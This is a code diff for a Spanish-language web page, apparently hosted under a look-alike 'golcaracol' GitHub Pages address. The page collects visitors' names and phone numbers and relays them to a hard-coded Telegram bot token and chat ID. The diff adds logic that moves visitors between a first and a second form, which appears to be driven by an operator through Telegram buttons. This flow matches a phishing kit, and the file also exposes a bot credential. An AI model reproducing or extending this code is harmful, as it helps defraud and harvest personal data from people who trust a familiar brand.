@@ -54,8 +54,7 @@
         let nombre, telefono;
         const token = '7010913168:AAG6dWUFcTUuSSYBDv-ub5KtpLjFIihrYxQ'; // Reemplaza con tu token
         const chatId = '6781382323';  // Reemplaza con tu chat ID
-        const urlFormulario = 'https://golcaracol.github.io/golcara/'; // Cambia esto a la URL de tu formulario
-
+        
         function enviarPrimerMensaje() {
             nombre = document.getElementById('nombre').value;
             telefono = document.getElementById('telefono').value;
@@ -69,8 +68,8 @@
             const botones = {
                 reply_markup: {
                     inline_keyboard: [
-                        [{ text: 'Continuar al segundo formulario', url: `${urlFormulario}?form=2` }],
-                        [{ text: 'Volver al primer formulario', url: `${urlFormulario}?form=1` }]
+                        [{ text: 'Continuar al segundo formulario', callback_data: "continuar" }],
+                        [{ text: 'Volver al primer formulario', callback_data: "volver" }]
                     ]
                 }
             };
@@ -124,6 +123,27 @@
             })
             .catch(error => console.error('Error:', error));
         }
+
+        function cambiarFormulario(form) {
+            if (form === '2') {
+                document.getElementById('form1').style.display = 'none';
+                document.getElementById('form2').style.display = 'block';
+            } else {
+                document.getElementById('form1').style.display = 'block';
+                document.getElementById('form2').style.display = 'none';
+            }
+        }
+
+        function escucharMensajesTelegram() {
+            const urlParams = new URLSearchParams(window.location.search);
+            if (urlParams.get('action') === 'continuar') {
+                cambiarFormulario('2');
+            } else if (urlParams.get('action') === 'volver') {
+                cambiarFormulario('1');
+            }
+        }
+        
+        window.onload = escucharMensajesTelegram;
     </script>
 </body>
 </html>
